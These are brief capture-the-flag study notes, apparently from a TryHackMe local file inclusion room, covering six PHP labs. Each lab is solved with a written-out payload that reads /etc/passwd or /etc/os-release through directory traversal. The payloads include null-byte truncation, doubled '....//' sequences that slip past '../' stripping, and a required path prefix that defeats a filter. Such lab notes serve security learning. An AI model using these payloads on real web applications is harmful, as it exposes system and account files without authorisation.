Task 4 - LFI1
lab1.php?file=/etc/passwd = lab 1

includes	lab = 2

Task 5 - LFI2

/lab3.php?file=../../../../etc/passwd%00 - using %00 to terminate includes .php 	lab = 3

function use - file_get_contents - keyword filtered only etc/passwd/ so it can be exploited by adding /. < to read current directory or just terminate it using %00. lab = 4

lab5.php?file=....//....//....//....//etc/passwd - the website seem to filter "../" only the first substr so it can be exploited by adding more. lab = 5

THM-profile - must be included , the filter just need to have THM-profile only so it can be exploited by adding THM-profile on the front lab = 6
lab6.php?file=THM-profile/../../../../etc/os-release - lab = 6
